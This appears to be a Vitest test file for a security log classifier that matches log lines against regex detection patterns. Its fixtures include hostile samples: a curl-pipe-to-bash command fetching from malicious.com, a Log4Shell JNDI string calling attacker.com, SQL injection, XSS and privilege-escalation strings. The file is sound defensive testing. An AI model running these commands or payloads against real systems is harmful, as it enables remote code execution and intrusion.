import { describe, it, expect } from 'vitest'
import { readFileSync } from 'fs'
import { fileURLToPath } from 'url'
import { dirname, join } from 'path'

const __filename = fileURLToPath(import.meta.url)
const __dirname = dirname(__filename)

const LOG_PATTERNS_RAW = JSON.parse(readFileSync(join(__dirname, '..', 'knowledge-base', 'log-patterns.json'), 'utf-8'))

const LOG_PATTERNS = {}
for (const [key, pattern] of Object.entries(LOG_PATTERNS_RAW)) {
  LOG_PATTERNS[key] = {
    ...pattern,
    pattern: new RegExp(pattern.pattern, pattern.patternFlags || 'i')
  }
}

function classifyLog(logEntry) {
  const matches = []
  
  for (const [key, pattern] of Object.entries(LOG_PATTERNS)) {
    if (pattern.pattern.test(logEntry)) {
      matches.push({ key, ...pattern })
    }
  }
  
  return { matches, hasMatch: matches.length > 0 }
}

describe('Log Classifier Tests', () => {
  it('should detect SSH brute force pattern', () => {
    const log = 'Jun 12 03:14:22 web01 sshd[1234]: Failed password for root from 45.33.32.156 port 54321'
    const result = classifyLog(log)
    expect(result.hasMatch).toBe(true)
    expect(result.matches.some(m => m.type === 'Brute Force')).toBe(true)
  })

  it('should detect SQL injection pattern', () => {
    const log = 'GET /api/users?id=1 union select * from passwords'
    const result = classifyLog(log)
    expect(result.hasMatch).toBe(true)
    expect(result.matches.some(m => m.type === 'SQL Injection')).toBe(true)
    expect(result.matches.find(m => m.type === 'SQL Injection').severity).toBe('high')
  })

  it('should detect RCE command pattern', () => {
    const log = 'Executed: curl http://malicious.com/shell.sh | bash'
    const result = classifyLog(log)
    expect(result.hasMatch).toBe(true)
    expect(result.matches.some(m => m.type === 'Remote Code Execution')).toBe(true)
    expect(result.matches.find(m => m.type === 'Remote Code Execution').severity).toBe('critical')
  })

  it('should return no match for clean log', () => {
    const log = 'INFO: Application started successfully on port 8080'
    const result = classifyLog(log)
    expect(result.hasMatch).toBe(false)
    expect(result.matches.length).toBe(0)
  })

  it('should detect XSS pattern', () => {
    const log = 'GET /search?q=<script>alert(1)</script>'
    const result = classifyLog(log)
    expect(result.hasMatch).toBe(true)
    expect(result.matches.some(m => m.type === 'Cross-Site Scripting (XSS)')).toBe(true)
  })

  it('should detect privilege escalation pattern', () => {
    const log = 'User executed: sudo -i'
    const result = classifyLog(log)
    expect(result.hasMatch).toBe(true)
    expect(result.matches.some(m => m.type === 'Privilege Escalation')).toBe(true)
  })

  it('should detect data exfiltration pattern', () => {
    const log = 'Upload to mega.nz detected from internal host'
    const result = classifyLog(log)
    expect(result.hasMatch).toBe(true)
    expect(result.matches.some(m => m.type === 'Data Exfiltration')).toBe(true)
  })

  it('should detect Log4Shell pattern', () => {
    const log = 'Request contains: ${jndi:ldap://attacker.com/exploit}'
    const result = classifyLog(log)
    expect(result.hasMatch).toBe(true)
    expect(result.matches.some(m => m.type === 'Log4Shell (CVE-2021-44228)')).toBe(true)
  })

  it('should detect multiple patterns in same log', () => {
    const log = 'Failed authentication attempt with SQL injection: union select'
    const result = classifyLog(log)
    expect(result.hasMatch).toBe(true)
    expect(result.matches.length).toBeGreaterThan(1)
  })
})
